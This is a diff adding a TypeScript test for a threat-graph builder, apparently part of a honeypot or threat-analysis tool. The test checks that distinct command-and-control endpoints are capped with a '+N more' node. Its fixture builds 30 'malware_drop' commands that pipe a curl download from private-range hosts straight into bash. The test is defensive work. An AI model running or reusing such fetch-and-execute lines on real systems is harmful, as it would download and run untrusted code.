@@ -81,6 +81,20 @@ test("dedupes the same C2 host:port into a single node", () => {
   assert.equal(c2.length, 1, "the same C2 host:port must collapse to one node")
 })
 
+test("caps IoC nodes and adds a '+N more' node when a session carries many distinct C2 endpoints", () => {
+  const manyC2Commands = Array.from({ length: 30 }, (_, i) => ({
+    command: `curl -fsSL http://10.0.${i}.1:1987/fav.ico | bash`,
+    ts: "2026-06-15T10:00:00Z",
+    category: "malware_drop" as const,
+  }))
+  const { nodes } = buildThreatGraph(baseThreat({ classifiedCommands: manyC2Commands }), null)
+  const iocs = nodes.filter((n) => n.data.kind === "ioc")
+  assert.equal(iocs.length, 25, "24 real IoC nodes + 1 '+N more' node")
+  const more = iocs.find((n) => n.id === "ioc-more")
+  assert.ok(more, "should have a '+N more' node")
+  assert.match(more!.data.label, /^\+6 more$/)
+})
+
 test("with enrichment, adds infra and reputation nodes", () => {
   const enrichment = {
     ip: "57.129.12.51",
